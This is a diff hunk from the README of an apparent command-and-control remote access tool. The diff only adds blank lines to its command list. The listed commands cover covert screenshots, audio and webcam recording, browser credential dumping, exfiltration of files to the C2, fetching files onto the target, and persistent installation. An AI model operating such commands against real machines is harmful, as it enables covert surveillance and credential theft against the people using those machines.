@@ -7,27 +7,40 @@ This tool enables security testers with explicit permission to remotely execute 
 
 # Basic System Commands
 `sessionid ls`                       # List directory contents  
+
 `sessionid pwd`                     # Show current directory  
-`sessionid whoami`                   # Show current user context  
+
+`sessionid whoami`                   # Show current user context 
+
 `sessionid ps`                       # List running processes  
+
 `sessionid netstat`                   # Show network connections  
+
 `sessionid sysinfo`                   # Get system information  
 
 # Surveillance & Recording 
 `sessionid screenshot`                # Capture screen and upload  
+
 `sessionid record-audio` [sec]        # Record audio (e.g., record-audio 10)  
+
 `sessionid webcam-shot`               # Take webcam photo  
+
 `sessionid webcam-record` [sec]       # Record webcam video (e.g., webcam-record 15)  
+
 `sessionid screen-record` [sec]       # Record screen (e.g., screen-record 20)  
 
 # Data Collection
 `sessionid dump-creds`                # Detect and extract browser credentials  
+
 `sessionid download` [file_path]      # Upload file from target to C2  
+
 `sessionidupload` [URL] [dest]        # Download file from URL to target  
 
 # Persistance & Management
 `sessionid persist`                  # Install multi-method persistence (survives reboot)  
+
 `sessionid unpersist`                # Remove all persistence methods  
+
 `sessionid exit`                     # Terminate C2 session  
 
 # Custom Commands
